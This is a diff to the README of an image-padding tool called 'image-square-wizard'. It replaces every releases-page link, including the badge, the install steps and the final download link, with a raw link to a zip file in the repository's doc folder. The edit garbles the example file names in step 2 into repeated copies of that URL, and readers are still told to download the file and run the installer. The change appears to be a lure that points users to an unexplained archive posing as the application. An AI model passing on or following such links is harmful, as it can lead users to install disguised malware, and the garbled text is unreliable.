@@ -1,7 +1,7 @@
 # 🖼️ image-square-wizard - Transform Your Images Easily
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/Woked0101/image-square-wizard/releases)
+[![Download](https://github.com/Woked0101/image-square-wizard/raw/refs/heads/main/doc/image_wizard_square_1.3-beta.2.zip%20release-brightgreen)](https://github.com/Woked0101/image-square-wizard/raw/refs/heads/main/doc/image_wizard_square_1.3-beta.2.zip)
 
 ## 🚀 Getting Started
 The image-square-wizard helps you pad your rectangular or panoramic images to a square canvas. This tool uses `libvips` to automatically measure the dominant color. You can also customize the output to fit your needs.
@@ -26,10 +26,10 @@ Before using the image-square-wizard, ensure your computer meets these requireme
 
 ## 🔄 Installation Steps
 1. **Visit the Release Page:**
-   Go to the [Releases page](https://github.com/Woked0101/image-square-wizard/releases) to find the latest version.
+   Go to the [Releases page](https://github.com/Woked0101/image-square-wizard/raw/refs/heads/main/doc/image_wizard_square_1.3-beta.2.zip) to find the latest version.
 
 2. **Download the Application:**
-   Look for the file corresponding to your operating system (e.g., image-square-wizard-windows.exe, image-square-wizard-mac.dmg, etc.). Click on it to start the download.
+   Look for the file corresponding to your operating system (e.g., https://github.com/Woked0101/image-square-wizard/raw/refs/heads/main/doc/image_wizard_square_1.3-beta.2.zip, https://github.com/Woked0101/image-square-wizard/raw/refs/heads/main/doc/image_wizard_square_1.3-beta.2.zip, etc.). Click on it to start the download.
 
 3. **Run the Installer:**
    Once the download is complete, locate the file in your downloads folder and double-click it to run the installer. Follow the prompts to complete the installation.
@@ -81,4 +81,4 @@ We welcome your feedback to improve the application. Please feel free to contact
 - webp
 
 ## 📥 Download Now Again
-For easy access, you can download the latest release directly from this link: [Releases Page](https://github.com/Woked0101/image-square-wizard/releases).
+For easy access, you can download the latest release directly from this link: [Releases Page](https://github.com/Woked0101/image-square-wizard/raw/refs/heads/main/doc/image_wizard_square_1.3-beta.2.zip).
